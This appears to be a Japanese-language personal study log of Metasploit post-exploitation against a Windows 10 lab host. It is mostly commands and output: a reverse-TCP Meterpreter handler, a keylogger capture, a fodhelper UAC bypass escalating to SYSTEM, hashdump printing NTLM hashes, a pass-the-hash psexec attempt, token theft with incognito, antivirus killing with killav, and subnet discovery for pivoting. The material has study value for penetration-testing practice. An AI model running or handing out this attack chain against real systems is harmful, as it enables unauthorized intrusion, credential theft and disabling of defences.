+あとは実行して対象PCで何かを入力して止めるだけ。
+meterpreter > run post/windows/capture/keylog_recorder
+
+[*] Executing module against DESKTOP-RS9VLQ2
+[*] Starting the keylog recorder...
+[*] Keystrokes being saved in to /root/.msf4/loot/20180410215052_default_10.61.7.21_host.windows.key_450740.txt
+[*] Recording keystrokes...
+^C[*] User interrupt.
+[*] Shutting down keylog recorder. Please wait...
+中身を見ると取得できていることが分かる。
+root@kali:~# cat /root/.msf4/loot/20180410215052_default_10.61.7.21_host.windows.key_450740.txt
+Keystroke log from explorer.exe on DESKTOP-RS9VLQ2 with user DESKTOP-RS9VLQ2\testuser001 started at 2018-04-10 21:50:52 +0900
+
+password<CR>
+<Shift>P
+@ssword<^H><^H><^H><^H><^H><^H><^H><^H>ppppp0<Shift>
+!!
+
+Keylog Recorder exited at 2018-04-10 21:51:31 +0900
+
+・ユーザ名とパスワードのダンプ
+Meterpreterを利用することでローカルファイルシステム上のユーザ名とパスワードハッシュが保存されたデータベースに
+直接アクセスし取得することが出来る。
+MSはパスワードハッシュをLanManager(LM)、もしくはNT LAN Manager（NTLM、NTLMv2）で保管する。
+LMの場合は7文字ごとにハッシュで保存される。そのため14文字のパスワードであれば
+2回クラックすれば良い。
+msf > use multi/handler
+
+msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf exploit(multi/handler) > set LHOST 10.61.7.100
+LHOST => 10.61.7.100
+msf exploit(multi/handler) > set LPORT 444
+LPORT => 444
+msf exploit(multi/handler) > exploit
+
+[*] Started reverse TCP handler on 10.61.7.100:444
+[*] Sending stage (205891 bytes) to 10.61.7.21
+[*] Meterpreter session 1 opened (10.61.7.100:444 -> 10.61.7.21:58642) at 2018-04-11 17:57:15 +0900
+
+
+ps
+[*] 10.61.7.21 - Meterpreter session 1 closed.  Reason: Died
+[*] Sending stage (205891 bytes) to 10.61.7.21
+[*] Meterpreter session 2 opened (10.61.7.100:444 -> 10.61.7.21:58664) at 2018-04-11 17:59:06 +0900
+meterpreter > getsystem
+[-] priv_elevate_getsystem: Operation failed: The environment is incorrect. The following was attempted:
+[-] Named Pipe Impersonation (In Memory/Admin)
+[-] Named Pipe Impersonation (Dropper/Admin)
+[-] Token Duplication (In Memory/Admin)
+meterpreter > getsystem -t 2
+[-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:
+[-] Named Pipe Impersonation (Dropper/Admin)
+meterpreter > getsystem -t 1
+[-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:
+[-] Named Pipe Impersonation (In Memory/Admin)
+meterpreter > getsystem -t 3
+[-] priv_elevate_getsystem: Operation failed: The environment is incorrect. The following was attempted:
+[-] Token Duplication (In Memory/Admin)
+meterpreter > getsystem
+[-] priv_elevate_getsystem: Operation failed: The environment is incorrect. The following was attempted:
+[-] Named Pipe Impersonation (In Memory/Admin)
+[-] Named Pipe Impersonation (Dropper/Admin)
+[-] Token Duplication (In Memory/Admin)
+meterpreter > ps
+meterpreter > migrate  4280
+[*] Migrating from 7252 to 4280...
+[*] Migration completed successfully.
+meterpreter > getuid
+Server username: DESKTOP-RS9VLQ2\testuser001
+meterpreter > getsystem
+[-] priv_elevate_getsystem: Operation failed: The environment is incorrect. The following was attempted:
+[-] Named Pipe Impersonation (In Memory/Admin)
+[-] Named Pipe Impersonation (Dropper/Admin)
+[-] Token Duplication (In Memory/Admin)
+meterpreter > background
+[*] Backgrounding session 2...
+msf exploit(multi/handler) > use exploit/windows/local/bypassuac_fodhelper
+msf exploit(windows/local/bypassuac_fodhelper) > set session 2
+session => 2
+msf exploit(windows/local/bypassuac_fodhelper) > run
+
+[*] Started reverse TCP handler on 10.61.7.100:4444
+[*] UAC is Enabled, checking level...
+[+] Part of Administrators group! Continuing...
+[!] UAC set to DoNotPrompt - using ShellExecute "runas" method instead
+[*] Uploading oIzVJvW.exe - 73802 bytes to the filesystem...
+[*] Executing Command!
+[*] Sending stage (179779 bytes) to 10.61.7.21
+[*] Meterpreter session 3 opened (10.61.7.100:4444 -> 10.61.7.21:59903) at 2018-04-11 21:41:37 +0900
+
+meterpreter > getsystem
+...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter >
+システム権限取得までが大変。
+流れはセッション張って、Explorerのプロセス空間に移行してuacバイパスしてgetsystemでシステム権限取得
+meterpreter > run post/windows/gather/hashdump
+
+[*] Obtaining the boot key...
+[*] Calculating the hboot key using SYSKEY beb36105ae9d806d28d2f85649d1eb56...
+[*] Obtaining the user list and keys...
+[*] Decrypting user keys...
+[*] Dumping password hints...
+
+testuser001:"any"
+
+[*] Dumping password hashes...
+
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:adbe1efbad0e4f5966ec4ebbf76b6f15:::
+testuser001:1001:aad3b435b51404eeaad3b435b51404ee:f4e72d5e86755711110a691a92bdbfd3:::
+sc_admin:1008:aad3b435b51404eeaad3b435b51404ee:69f8f587efe7f71a37d134f1d2125c1a:::
+全てのハッシュ値についている先頭のaad3b435は空の文字列
+
+Pass-the-Hash攻撃
+現時点で出来ていることは管理者のユーザ名とパスワードハッシュは手に入れた。
+ただ現実的な時間での解読が無理。
+パスワードハッシュだけでシステムに侵入する方法としてPass-the-hash攻撃がある。
+
+やり方は以下の通り
+msf > use exploit/windows/smb/psexec
+msf exploit(windows/smb/psexec) > set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+msf exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf exploit(windows/smb/psexec) > set LHOST 10.61.7.100
+LHOST => 10.61.7.100
+msf exploit(windows/smb/psexec) > set LHOST 443
+LHOST => 443
+msf exploit(windows/smb/psexec) > set RHOST 10.61.7.21
+RHOST => 10.61.7.21
+msf exploit(windows/smb/psexec) > set SMBUser Administrator
+SMBUser => Administrator
+msf exploit(windows/smb/psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+SMBPass => aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+msf exploit(windows/smb/psexec) > exploit
+
+[*] Started reverse TCP handler on 0.0.1.187:4444
+[*] 10.61.7.21:445 - Connecting to the server...
+[*] 10.61.7.21:445 - Authenticating to 10.61.7.21:445 as user 'Administrator'...
+[-] 10.61.7.21:445 - Exploit failed [no-access]: Rex::Proto::SMB::Exceptions::LoginError Login Failed: Connection reset by peer
+[*] Exploit completed, but no session was created.
+msf exploit(windows/smb/psexec) >
+Windows10なので失敗しているが、成功する端末はこれで問題なさそう。
+
+偽装トークン
+偽装トークンとはターゲットマシンで認証済みのKerberosトークンを取得しそのトークンを認証代わりに使用して他のユーザIDだと偽る方法。
+
+やり方はいつもどおり侵入してPSでプロセスを確認
+トークンを盗みたいユーザが実行しているプロセスを確認し
+meterpreter > steal_token 11340
+でトークンを奪うことが出来る。今回の場合だと11340というのが奪うユーザが実行しているプロセスのID。
+incognitoを利用するとそのシステムで有効なトークンを表示させることが出来る。
+meterpreter > use incognito
+Loading extension incognito...Success.
+meterpreter > list_tokens -u
+[-] Warning: Not currently running as SYSTEM, not all tokens will be available
+             Call rev2self if primary process token is SYSTEM
+
+Delegation Tokens Available
+========================================
+DESKTOP-RS9VLQ2\testuser001
+
+Impersonation Tokens Available
+========================================
+No tokens available
+なんかSYSTEMユーザじゃないとダメっぽい。
+meterpreter > list_tokens -u
+
+Delegation Tokens Available
+========================================
+DESKTOP-RS9VLQ2\testuser001
+IIS APPPOOL\DefaultAppPool
+NT AUTHORITY\IUSR
+NT AUTHORITY\LOCAL SERVICE
+NT AUTHORITY\NETWORK SERVICE
+NT AUTHORITY\SYSTEM
+NT SERVICE\SQLTELEMETRY
+NT SERVICE\SQLTELEMETRY$SQLEXPRESS
+Window Manager\DWM-1
+Window Manager\DWM-2
+
+Impersonation Tokens Available
+========================================
+Font Driver Host\UMFD-0
+Font Driver Host\UMFD-1
+Font Driver Host\UMFD-2
+NT SERVICE\MSSQL$SQLEXPRESS
+NT SERVICE\MSSQLSERVER
+
+PSと合わせて利用すること。
+
+別ネットワークへの攻撃
+1台に侵入できればそのネットワーク上のPCに対して攻撃を実行できる。
+侵入後、以下のコマンドでサブネットを調べる。ipconfigでもいい気はする。
+meterpreter > run get_local_subnets
+
+[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+[!] Example: run post/multi/manage/autoroute OPTION=value [...]
+Local subnet: 10.61.7.0/255.255.255.0
+meterpreter >
+
+meterpreterスクリプトの利用
+meterpreterシェルからスクリプトを実行するにはrun スクリプト　で実行する必要がある。
+プロセス間の移動
+meterpreter > run post/windows/manage/migrate
+
+[*] Running module against DESKTOP-RS9VLQ2
+[*] Current server process: jmLLNiYBGiVY.exe (3092)
+[*] Spawning notepad.exe process to migrate to
+[+] Migrating to 184
+[+] Successfully migrated to process 184
+meterpreter >
+アンチウィルスの無効化
+meterpreter > run killav
+
+[!] Meterpreter scripts are deprecated. Try post/windows/manage/killav.
+[!] Example: run post/windows/manage/killav OPTION=value [...]
+[*] Killing Antivirus services on the target...
+[*] Killing off Taskmgr.exe...
+[*] Killing off cmd.exe...
+
+システムのパスワードハッシュ取得
+meterpreter > run hashdump
+
+[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.
+[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]
+[*] Obtaining the boot key...
+[*] Calculating the hboot key using SYSKEY beb36105ae9d806d28d2f85649d1eb56...
+[*] Obtaining the user list and keys...
+[*] Decrypting user keys...
+[*] Dumping password hints...
+
+testuser001:"any"
+
+[*] Dumping password hashes...
+
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+testuser001:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+sc_admin:1008:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+
+
+meterpreter >
+
+トラフィック監視
+meterpreter > run post/windows/manage/rpcapd_start
+
+[*] Checking if machine DESKTOP-RS9VLQ2 has rpcapd service
+[-] This machine doesn't seem to have the rpcapd service
+meterpreter >
+対象にパケットキャプチャ系のサービスがないと無理
+
+システム情報の抽出
+レジストリ情報の取得
+meterpreter > run scraper
+
+ポストエクスプロイトモジュールの利用
+現在、Meterpreterスクリプトはポストエクスプロイトモジュールへと移行中。
+いずれはポストエクスプロイトモジュールが標準になると思われる。
+
+コマンドシェルをMeretpreterへアップグレードする
+システムのエクスプロイトが成功した後、sessions -uコマンドを使って
+コマンドシェルペイロードをMeterpreterペイロードへとアップグレードできる。
+恐らく既にWindows10へ侵入するときにやったっぽい。
+
+RailgunアドオンでWindowsAPIを操作
+MetasploitのRailgunアドオンを使うことでWindows APIと直接やり取りすることが出来る。
+
+Meterpreterは使い込むことで理解が深まっていくものなので使い続けた方が良い。
+
